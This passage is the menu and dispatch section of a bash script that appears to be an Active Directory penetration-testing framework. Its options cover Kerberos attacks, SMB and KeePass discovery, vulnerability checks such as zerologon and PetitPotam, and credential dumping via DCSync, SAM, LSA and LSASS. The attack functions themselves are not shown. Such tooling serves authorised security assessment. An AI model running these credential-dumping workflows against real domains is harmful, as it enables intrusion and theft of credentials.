        john_crack_asrep
        kerberos_menu
        ;;
        
        6)
        john_crack_kerberoast
        kerberos_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        kerberos_menu
        ;;
    esac
}

shares_menu () {
    echo -e ""
    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------"
    echo -e "1) SMB shares Enumeration on target Domain Controller"
    echo -e "2) SMB shares Enumeration on all domain servers"
    echo -e "3) SMB shares Enumeration on custom list of servers"
    echo -e "4) KeePass Discovery on target Domain Controller"
    echo -e "5) KeePass Discovery on all domain servers"
    echo -e "6) KeePass Discovery on custom list of servers"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        1)
        dns_enum
        smb_map_dc
        shares_menu
        ;;

        2)
        dns_enum
        allservers_bool=true
        smb_map
        shares_menu
        ;;

        3)
        dns_enum
        allservers_bool=false
        while [ ! -f "${servers_list}" ] ; do
            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        done
        smb_map
        shares_menu
        ;;

        4)
        dns_enum
        keepass_scan_dc
        shares_menu
        ;;

        5)
        dns_enum
        allservers_bool=true
        keepass_scan
        shares_menu
        ;;

        6)
        dns_enum
        allservers_bool=false
        while [ ! -f "${servers_list}" ] ; do
            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        done
        keepass_scan
        shares_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        shares_menu
        ;;
    esac
 
}

vulns_menu () {
    echo -e ""
    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "A) ALL VULNERABILITY CHECKS"
    echo -e "1) NoPac check"
    echo -e "2) PetitPotam check"
    echo -e "3) dfscoerce check"
    echo -e "4) zerologon check"
    echo -e "5) MS17-010 check on Domain Controllers"
    echo -e "6) MS17-010 check on all domain servers"
    echo -e "7) MS17-010 check on custom list of servers"
    echo -e "8) Print Spooler check on Domain Controllers"
    echo -e "9) Print Spooler check on all domain servers"
    echo -e "10) Print Spooler check on custom list of servers"
    echo -e "11) WebDAV check on Domain Controllers"
    echo -e "12) WebDAV check on all domain servers"
    echo -e "13) WebDAV check on custom list of servers"
    echo -e "14) shadowcoerce check on Domain Controllers"
    echo -e "15) shadowcoerce check on all domain servers"
    echo -e "16) shadowcoerce check on custom list of servers"
    echo -e "17) ntlmv1 check on Domain Controllers"
    echo -e "18) ntlmv1 check on all domain servers"
    echo -e "19) ntlmv1 check on custom list of servers"
    echo -e "20) runasppl check on Domain Controllers"
    echo -e "21) runasppl check on all domain servers"
    echo -e "22) runasppl check on custom list of servers"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        A)
        dns_enum
        vuln_checks
        vulns_menu
        ;;

        1)
        nopac_check
        vulns_menu
        ;;

		2)
        petitpotam_check
        vulns_menu
        ;;

		3)
        dfscoerce_check
        vulns_menu
        ;;
        
        4)
        zerologon_check
        vulns_menu
        ;;

        5)
        ms17-010_check_dc
        vulns_menu
        ;;

		6)
        dns_enum
        allservers_bool=true        
        ms17-010_check
        vulns_menu
        ;;
        
        7)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        ms17-010_check
        vulns_menu
        ;;

        8)
        spooler_check_dc
        vulns_menu
        ;;

		9)
        dns_enum
        allservers_bool=true        
        spooler_check
        vulns_menu
        ;;
        
        10)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        spooler_check
        vulns_menu
        ;;

        11)
        webdav_check_dc
        vulns_menu
        ;;

        12)
        dns_enum
        allservers_bool=true
        webdav_check
        vulns_menu
        ;;

        13)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        webdav_check
        vulns_menu
        ;;

        14)
        shadowcoerce_check_dc
        vulns_menu
        ;;

        15)
        dns_enum
        allservers_bool=true
        shadowcoerce_check
        vulns_menu
        ;;

        16)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        shadowcoerce_check
        vulns_menu
        ;;

        17)
        ntlmv1_check_dc
        vulns_menu
        ;;

        18)
        dns_enum
        allservers_bool=true
        ntlmv1_check
        vulns_menu
        ;;

        19)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        ntlmv1_check
        vulns_menu
        ;;

        20)
        runasppl_check_dc
        vulns_menu
        ;;

        21)
        dns_enum
        allservers_bool=true
        runasppl_check
        vulns_menu
        ;;

        22)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        runasppl_check
        vulns_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        vulns_menu
        ;;
    esac
}

pwd_menu () {
    echo -e ""
    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------------"
    echo -e "A) ALL PASSWORD DUMPS"
    echo -e "1) LAPS Dump"
    echo -e "2) gMSA Dump"
    echo -e "3) DCSync using secretsdump"
    echo -e "4) Dump SAM from DC using crackmapexec"
    echo -e "5) Dump SAM from all domain servers using crackmapexec"
    echo -e "6) Dump SAM from custom list of servers using crackmapexec"
    echo -e "7) Dump LSA secrets from DC using crackmapexec"
    echo -e "8) Dump LSA secrets from all domain servers using crackmapexec"
    echo -e "9) Dump LSA secrets from custom list of servers using crackmapexec"
    echo -e "10) Dump LSASS from DC using lsassy"
    echo -e "11) Dump LSASS from all domain servers using lsassy"
    echo -e "12) Dump LSASS from custom list of servers using lsassy"
    echo -e "13) Dump LSASS from DC using handlekatz"
    echo -e "14) Dump LSASS from all domain servers using handlekatz"
    echo -e "15) Dump LSASS from custom list of servers using handlekatz"
    echo -e "16) Dump LSASS from DC using procdump"
    echo -e "17) Dump LSASS from all domain servers using procdump"
    echo -e "18) Dump LSASS from custom list of servers using procdump"
    echo -e "19) Dump LSASS from DC using nanodump"
    echo -e "20) Dump LSASS from all domain servers using nanodump"
    echo -e "21) Dump LSASS from custom list of servers using nanodump"
    echo -e "22) Dump secrets using DonPAPI from DC"
    echo -e "23) Dump secrets using DonPAPI from all domain servers"
    echo -e "24) Dump secrets using DonPAPI from custom list of servers"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        A)
        dns_enum
        pwd_dump
        pwd_menu
        ;;

        1)
        laps_dump
        pwd_menu
        ;;

		2)
        gmsa_dump
        pwd_menu
        ;;

        3)
        secrets_dump_dc
        pwd_menu
        ;;

        4)
        sam_dump_dc
        pwd_menu
        ;;

		5)
        sam_dump
        allservers_bool=true
        pwd_menu
        ;;
        
        6)
        sam_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        7)
        lsa_dump_dc
        pwd_menu
        ;;

        8)
        lsa_dump
        allservers_bool=true
        pwd_menu
        ;;

        9)
        lsa_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        10)
        lsassy_dump_dc
        pwd_menu
        ;;

        11)
        lsassy_dump
        allservers_bool=true
        pwd_menu
        ;;

        12)
        lsassy_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        13)
        handlekatz_dump_dc
        pwd_menu
        ;;

        14)
        handlekatz_dump
        allservers_bool=true
        pwd_menu
        ;;

        15)
        handlekatz_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        16)
        procdump_dump_dc
        pwd_menu
        ;;

        17)
        procdump_dump
        allservers_bool=true
        pwd_menu
        ;;

        18)
        procdump_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        19)
        nanodump_dump_dc
        pwd_menu
        ;;

        20)
        nanodump_dump
        allservers_bool=true
        pwd_menu
        ;;

        21)
        nanodump_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        22)
        donpapi_dump_dc
        pwd_menu
        ;;

        23)
        donpapi_dump
        allservers_bool=true
        pwd_menu
        ;;
        
        24)
        donpapi_dump
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        pwd_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        pwd_menu
        ;;
    esac
}

config_menu () {
    echo -e ""
    echo -e "${YELLOW}[i]${NC} Output folder: $(realpath $output_dir)"
    echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
    echo -e "${YELLOW}[i]${NC} Custom servers list: ${servers_list}"

    echo -e ""
    echo -e "${CYAN}[Config menu]${NC} Please choose from the following options:"
    echo -e "-------------------------------------------------------"
    echo -e "1) Change output folder"
    echo -e "2) Synchronize time with Domain Controller (requires root)"
    echo -e "3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
    echo -e "4) Update resolv.conf to define Domain Controller as DNS server (requires root)"
    echo -e "5) Change users wordlist file"
    echo -e "6) Change passwords wordlist file"
    echo -e "7) Define custom servers list"
    echo -e "99) Back to Main Menu"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        1)
        output_dir_old=$output_dir
        echo -e "Please specify new output folder:"
        read -p ">> " output_dir </dev/tty
        mv $output_dir_old $output_dir
        echo -e "${GREEN}[+] Output folder updated${NC}"
        echo -e ""
        config_menu
        ;;

		2)
        echo -e ""
        sudo ntpdate ${dc_ip}
        echo -e "${GREEN}[+] NTP sync complete${NC}"
        config_menu
        ;;

        3)
        echo -e ""
        echo -e "" | sudo tee -a /etc/hosts
        echo -e "${dc_ip}\t${dc_domain}" | sudo tee -a /etc/hosts
        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
        echo -e ""
        config_menu
        ;;

        4)
        echo -e ""
        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
        echo -e "${GREEN}[+] DNS update complete${NC}"
        echo -e ""
        config_menu
        ;;

        5)
        echo -e "Please specify new users wordlist file:"
        read -p ">> " users_list </dev/tty
        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
        echo -e ""
        config_menu
        ;;

		6)
        echo -e "Please specify new passwords wordlist file:"
        read -p ">> " pass_list </dev/tty
        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
        echo -e ""        
        config_menu
        ;;
        
        7)
        echo -e "Please specify new custom servers list file:"
        read -p ">> " servers_list </dev/tty
        echo -e "${GREEN}[+] Custom servers list updated${NC}"
        echo -e ""
        config_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main_menu () {
    echo -e ""
    echo -e "${PURPLE}[Main menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "C) Configuration Menu"
    echo -e "1) Run DNS Enumeration using adidnsdump"
    echo -e "2) Active Directory Enumeration Menu"
    echo -e "3) Kerberos Attacks Menu"
    echo -e "4) SMB shares Enumeration Menu"
    echo -e "5) Vulnerability Checks Menu"
    echo -e "6) Password Dump Menu"
    echo -e "7) Run MSSQL Enumeration"
    echo -e "I) Show session information"
    echo -e "99) Quit"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        C)
        config_menu
        ;;

        1)
        dns_enum
        main_menu
        ;;

        2)
        ad_menu
        ;;

		3)
        kerberos_menu
        ;;

        4)
        shares_menu
        ;;

		5)
        vulns_menu
        ;;
        
        6)
        pwd_menu
        ;;
        
        7)
        mssql_enum
        main_menu
        ;;

        99)
        exit 1
        ;;

        I)
        print_banner
        print_info
        echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
        echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
        echo -e "${YELLOW}[i]${NC} Custom servers list: ${servers_list}"
        main_menu
        ;;

        *)
        echo -e ""
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main () {
    prepare
    
    if [[ "$modules" == *"interactive"* ]]; then
        modules="interactive" 
    fi

    print_banner
    print_info

    for i in $(echo $modules | sed "s/,/ /g"); do
        case $i in
            interactive)
            main_menu
            echo -e ""
            ;;

            ad_enum)
            dns_enum
            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
            echo -e "${GREEN}------------------------------------------------${NC}"
            echo -e ""
            ad_enum
            echo -e ""
            ;;

            kerberos)
            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            kerberos
            echo -e ""
            ;;

            scan_shares)
            dns_enum
            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
            echo -e "${GREEN}---------------------------------------${NC}"
            echo -e ""
            scan_shares
            ;;

            pwd_dump)
            dns_enum
            echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
            echo -e "${GREEN}---------------------------------${NC}"
            echo -e ""
            pwd_dump
            ;;

            mssql_enum)
            dns_enum
            echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
            echo -e "${GREEN}-------------------------------------${NC}"
            echo -e ""
            mssql_enum
            echo -e ""
            ;;

            vuln_checks)
            dns_enum
            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
            echo -e "${GREEN}----------------------------------------${NC}"
            echo -e ""
            vuln_checks
            echo -e ""
            ;;

            all)
            dns_enum
            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
            echo -e "${GREEN}------------------------------------------------${NC}"
            echo -e ""
            ad_enum
            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            kerberos
            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
            echo -e "${GREEN}---------------------------------------${NC}"
            echo -e ""
            scan_shares
            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
            echo -e "${GREEN}----------------------------------------${NC}"
            echo -e ""
            vuln_checks
            echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
            echo -e "${GREEN}-------------------------------------${NC}"
            echo -e ""
            mssql_enum
            echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
            echo -e "${GREEN}---------------------------------${NC}"
            echo -e ""
            pwd_dump
            ;;

            user)
            dns_enum
            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
            echo -e "${GREEN}------------------------------------------------${NC}"
            echo -e ""
            ad_enum
            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            kerberos
            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
            echo -e "${GREEN}---------------------------------------${NC}"
            echo -e ""
            scan_shares
            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
            echo -e "${GREEN}----------------------------------------${NC}"
            echo -e ""
            vuln_checks
            echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
            echo -e "${GREEN}-------------------------------------${NC}"
            echo -e ""
            mssql_enum
            ;;

            *)
            echo -e "${RED}[-] Unknown module $i... ${NC}"
            echo -e ""
            ;;
        esac
    done

    echo -e ""
    echo -e "${GREEN}[+] All modules have completed. Output folder is: $(realpath $output_dir)${NC}"
    echo -e "${GREEN}------------------------------------------------${NC}"
}

main
